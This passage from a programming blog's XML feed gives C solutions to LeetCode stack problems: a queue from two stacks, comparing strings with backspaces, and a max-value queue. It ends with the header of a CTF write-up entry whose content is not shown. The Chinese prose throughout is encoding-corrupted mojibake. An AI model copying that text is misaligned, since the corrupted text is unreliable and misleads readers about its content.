class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> * in_stack;</span><br><span class="line">    <span class="type">int</span> * out_stack;</span><br><span class="line">    <span class="type">int</span> top_in;</span><br><span class="line">    <span class="type">int</span> top_out;</span><br><span class="line">&#125; CQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">CQueue* <span class="title">cQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CQueue *queue = (CQueue*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(CQueue));</span><br><span class="line">    queue-&gt;top_in = <span class="number">-1</span>;</span><br><span class="line">    queue-&gt;top_out = <span class="number">-1</span>;</span><br><span class="line">    queue-&gt;in_stack = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10005</span>);</span><br><span class="line">    queue-&gt;out_stack = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10005</span>);</span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cQueueAppendTail</span><span class="params">(CQueue* obj, <span class="type">int</span> value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj-&gt;top_in++;</span><br><span class="line">    obj-&gt;in_stack[obj-&gt;top_in] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cQueueDeleteHead</span><span class="params">(CQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;top_in == <span class="number">-1</span>&amp;&amp;obj-&gt;top_out == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;top_out == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;top_in!=<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            obj-&gt;top_out++;</span><br><span class="line">            obj-&gt;out_stack[obj-&gt;top_out] = obj-&gt;in_stack[obj-&gt;top_in];</span><br><span class="line">            obj-&gt;top_in--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;top_out--;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;out_stack[obj-&gt;top_out+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cQueueFree</span><span class="params">(CQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;in_stack);</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;out_stack);</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CQueue* obj = cQueueCreate();</span></span><br><span class="line"><span class="comment"> * cQueueAppendTail(obj, value);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_2 = cQueueDeleteHead(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * cQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/9ij4FrL3vkIGect.png" alt="image.png"></p><p>é‚£ä¹ˆåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œ<strong>ã€ç®€å•ã€‘</strong>éš¾åº¦çš„offeré¢˜å°±åˆ·å®Œäº†</p><h2 id="0x06-æ¯”è¾ƒå«é€€æ ¼çš„å­—ç¬¦ä¸²"><a href="#0x06-æ¯”è¾ƒå«é€€æ ¼çš„å­—ç¬¦ä¸²" class="headerlink" title="0x06.æ¯”è¾ƒå«é€€æ ¼çš„å­—ç¬¦ä¸²"></a>0x06.<a href="https://leetcode-cn.com/problems/backspace-string-compare/">æ¯”è¾ƒå«é€€æ ¼çš„å­—ç¬¦ä¸²</a></h2><blockquote><p>ç»™å®š S å’Œ T ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå½“å®ƒä»¬åˆ†åˆ«è¢«è¾“å…¥åˆ°ç©ºç™½çš„æ–‡æœ¬ç¼–è¾‘å™¨åï¼Œåˆ¤æ–­äºŒè€…æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶è¿”å›ç»“æœã€‚ # ä»£è¡¨é€€æ ¼å­—ç¬¦ã€‚</p><p>æ³¨æ„ï¼šå¦‚æœå¯¹ç©ºæ–‡æœ¬è¾“å…¥é€€æ ¼å­—ç¬¦ï¼Œæ–‡æœ¬ç»§ç»­ä¸ºç©ºã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼šS &#x3D; â€œab#câ€, T &#x3D; â€œad#câ€<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šS å’Œ T éƒ½ä¼šå˜æˆ â€œacâ€ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼šS &#x3D; â€œab##â€, T &#x3D; â€œc#d#â€<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šS å’Œ T éƒ½ä¼šå˜æˆ â€œâ€ã€‚<br>ç¤ºä¾‹ 3ï¼š</p><p>è¾“å…¥ï¼šS &#x3D; â€œa##câ€, T &#x3D; â€œ#a#câ€<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šS å’Œ T éƒ½ä¼šå˜æˆ â€œcâ€ã€‚<br>ç¤ºä¾‹ 4ï¼š</p><p>è¾“å…¥ï¼šS &#x3D; â€œa#câ€, T &#x3D; â€œbâ€<br>è¾“å‡ºï¼šfalse<br>è§£é‡Šï¼šS ä¼šå˜æˆ â€œcâ€ï¼Œä½† T ä»ç„¶æ˜¯ â€œbâ€ã€‚</p><p>æç¤ºï¼š</p><p>1 &lt;&#x3D; S.length &lt;&#x3D; 200<br>1 &lt;&#x3D; T.length &lt;&#x3D; 200<br>S å’Œ T åªå«æœ‰å°å†™å­—æ¯ä»¥åŠå­—ç¬¦ â€˜#â€™ã€‚</p><p>è¿›é˜¶ï¼š</p><p>ä½ å¯ä»¥ç”¨ O(N) çš„æ—¶é—´å¤æ‚åº¦å’Œ O(1) çš„ç©ºé—´å¤æ‚åº¦è§£å†³è¯¥é—®é¢˜å—ï¼Ÿ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/backspace-string-compare">https://leetcode-cn.com/problems/backspace-string-compare</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>ä¸Šç”µè·¯åˆ†æè¯¾çš„æ—¶å€™é—²ç€æ— èŠï¼ˆå› ä¸ºå¬ä¸æ‡‚è¯¾ï¼ˆxï¼‰ï¼‰ç”¨iPadæ‰“çš„XD</p><p>é‡åˆ°æ™®é€šå­—ç¬¦å…¥æ ˆï¼Œé‡åˆ°<code>&#39;#&#39;</code>å‡ºæ ˆä¸€ä¸ªå­—ç¬¦å³å¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">backspaceCompare</span><span class="params">(<span class="type">char</span> * S, <span class="type">char</span> * T)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * s1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">205</span>),*s2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">205</span>);</span><br><span class="line">    <span class="type">int</span> len1 = <span class="number">0</span>, len2= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;S[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S[i] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(len1!=<span class="number">0</span>)</span><br><span class="line">                len1--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s1[len1++] = S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;T[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T[i] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(len2!=<span class="number">0</span>)</span><br><span class="line">                len2--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s2[len2++] = T[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len1!=len2)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s1[i]!=s2[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/RHMlXAVWP3bFQ4q.png" alt="image.png"></p><h1 id="0x02-éš¾åº¦ï¼šä¸­ç­‰"><a href="#0x02-éš¾åº¦ï¼šä¸­ç­‰" class="headerlink" title="0x02.éš¾åº¦ï¼šä¸­ç­‰"></a>0x02.éš¾åº¦ï¼šä¸­ç­‰</h1><h2 id="0x00-é˜Ÿåˆ—çš„æœ€å¤§å€¼"><a href="#0x00-é˜Ÿåˆ—çš„æœ€å¤§å€¼" class="headerlink" title="0x00.é˜Ÿåˆ—çš„æœ€å¤§å€¼"></a>0x00.<a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/">é˜Ÿåˆ—çš„æœ€å¤§å€¼</a></h2><blockquote><p>è¯·å®šä¹‰ä¸€ä¸ªé˜Ÿåˆ—å¹¶å®ç°å‡½æ•° max_value å¾—åˆ°é˜Ÿåˆ—é‡Œçš„æœ€å¤§å€¼ï¼Œè¦æ±‚å‡½æ•°max_valueã€push_back å’Œ pop_front çš„å‡æ‘Šæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(1)ã€‚</p><p>è‹¥é˜Ÿåˆ—ä¸ºç©ºï¼Œpop_front å’Œ max_value éœ€è¦è¿”å› -1</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥:<br>[â€œMaxQueueâ€,â€push_backâ€,â€push_backâ€,â€max_valueâ€,â€pop_frontâ€,â€max_valueâ€]<br>[[],[1],[2],[],[],[]]<br>è¾“å‡º: [null,null,null,2,1,2]<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥:<br>[â€œMaxQueueâ€,â€pop_frontâ€,â€max_valueâ€]<br>[[],[],[]]<br>è¾“å‡º: [null,-1,-1]</p><p>é™åˆ¶ï¼š</p><p>1 &lt;&#x3D; push_back,pop_front,max_valueçš„æ€»æ“ä½œæ•° &lt;&#x3D; 10000<br>1 &lt;&#x3D; value &lt;&#x3D; 10^5</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof">https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>åŒæ ·æ˜¯ä¸€é“æ¥è‡ªäºå‰‘æŒ‡offerçš„é¢˜ç›®ï¼Œç…§æŠ„ä¹‹å‰çš„ä¸¤ä¸ªæ ˆæ„å»ºé˜Ÿåˆ—å³å¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stack</span>* next;</span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">    Stack * in_stack;</span><br><span class="line">    Stack * out_stack;</span><br><span class="line">&#125; MaxQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">MaxQueue* <span class="title">maxQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MaxQueue * myQueue = (MaxQueue*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MaxQueue));</span><br><span class="line">    myQueue-&gt;in_stack = <span class="literal">NULL</span>;</span><br><span class="line">    myQueue-&gt;out_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> myQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxQueueMax_value</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;in_stack==<span class="literal">NULL</span>&amp;&amp;obj-&gt;out_stack==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">bool</span> pd1=<span class="literal">false</span>,pd2=<span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> max1,max2;</span><br><span class="line">    Stack* temp1=obj-&gt;in_stack,*temp2=obj-&gt;out_stack;</span><br><span class="line">    <span class="keyword">if</span>(temp1!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max1=temp1-&gt;value;</span><br><span class="line">        pd1 = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(temp2!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max2=temp2-&gt;value;</span><br><span class="line">        pd2 = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp1!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max1 = max1&gt;temp1-&gt;value?max1:temp1-&gt;value;</span><br><span class="line">        temp1 = temp1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp2!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max2 = max2&gt;temp2-&gt;value?max2:temp2-&gt;value;</span><br><span class="line">        temp2 = temp2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pd1&amp;&amp;pd2)</span><br><span class="line">        <span class="keyword">return</span> max1&gt;max2?max1:max2;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pd1)</span><br><span class="line">        <span class="keyword">return</span> max1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> max2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">maxQueuePush_back</span><span class="params">(MaxQueue* obj, <span class="type">int</span> value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = value;</span><br><span class="line">    s-&gt;next = obj-&gt;in_stack;</span><br><span class="line">    obj-&gt;in_stack = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxQueuePop_front</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj-&gt;in_stack==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> n = obj-&gt;out_stack-&gt;value;</span><br><span class="line">    temp = obj-&gt;out_stack;</span><br><span class="line">    obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">maxQueueFree</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack*temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;in_stack;</span><br><span class="line">        obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;out_stack;</span><br><span class="line">        obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MaxQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MaxQueue* obj = maxQueueCreate();</span></span><br><span class="line"><span class="comment"> * int param_1 = maxQueueMax_value(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * maxQueuePush_back(obj, value);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = maxQueuePop_front(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * maxQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/EOXigmlYwCteAoB.png" alt="image.png"></p><blockquote><p>å’•äº†ï¼Œåé¢æœ‰æ—¶é—´å†ç»§ç»­åšğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;æ ˆ&lt;/strong&gt;ï¼ˆ&lt;strong&gt;stack&lt;/strong&gt;ï¼‰æ˜¯åœ¨ä»»ä½•çš„æ•°æ®ç»“æ„è¯¾æœ¬å½“ä¸­éƒ½ä¼šèŠ±ä¸€å®šç¯‡å¹…æ¥è®²è¿°çš„æ•°æ®ç»“æ„ä¹‹ä¸€ï¼Œä½œä¸ºä¸€ç§æŠ½è±¡æ•°æ®ç»“æ„ï¼Œæ— è®ºæ˜¯åœ¨ç®—æ³•åº”ç”¨ï¼ˆé€†æ³¢å…°è¡¨è¾¾å¼ç­‰ï¼‰ã€è®¡ç»„åŸç†ï¼ˆå‡½æ•°è°ƒç”¨æ ˆç­‰ï¼‰è¿˜æ˜¯åœ¨å®‰å…¨é¢†åŸŸï¼ˆæ ˆæº¢å‡ºç­‰ï¼‰éƒ½èƒ½è§åˆ°è¿™ä¸€æŠ½è±¡æ•°æ®ç»“æ„çš„èº«å½±ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šä¸€ç¯‡å…³äºLeetcodeçš„åšæ–‡é‡Œæˆ‘ä»¬åˆ·äº†ç®€å•çº¿æ€§è¡¨â€”â€”å•å‘é“¾è¡¨çš„æœ‰å…³é¢˜ç›®ï¼Œé‚£ä¹ˆè¿™ä¸€æ¬¡æ¥åˆ·ä¸€åˆ·&lt;strong&gt;å—é™çº¿æ€§è¡¨&lt;/strong&gt;â€”â€”æ ˆçš„æœ‰å…³é¢˜ç›®å­2333333.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šè¿™ä¸ªç»ªè®ºæ˜¯åœ¨åŠå¤œå†™çš„ï¼Œå¯èƒ½æˆ‘å…¶å®è¿˜æ²¡å¼€å§‹åšé¢˜ï¼Œå¦‚æœä½ çœ‹åˆ°æ–‡ç« å­—æ•°ä¸åˆ°ä¸€åƒå­—çš„è¯å¯ä»¥å…ˆğŸ¦„ä½ç­‰åç»­çš„æ›´æ–°XD&lt;/p&gt;
&lt;p&gt;æ³¨2ï¼šå½“æ™šå›æ¥æ‰“è‡ªå·±è„¸ï¼Œå†™å®Œç»ªè®ºä¹‹åé©¬ä¸Šè‚äº†å‡ é“é¢˜23333&lt;/p&gt;
&lt;p&gt;æ³¨3ï¼šå‡ºäºä¸€äº›å¥‡æ€ªçš„åŸå› ï¼Œæˆ‘ä¼šä¼˜å…ˆé€‰æ‹©é¢è¯•é¢˜&lt;/p&gt;
&lt;p&gt;æ³¨4ï¼šç‚¹å‡»æ ‡é¢˜å¯ä»¥ç›´æ¥è¿›å…¥åŸé¢˜ç½‘å€&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ€åæ›´æ–°æ—¥æœŸï¼š2020.9.6&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="é¢˜è§£" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="é“¾è¡¨" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="æ ˆ" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x02ã€‘pwnable.tw write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/</id>
    <published>2020-08-17T13:19:29.000Z</published>
    <updated>2021-02-26T17:04:36.538Z</updated>
    
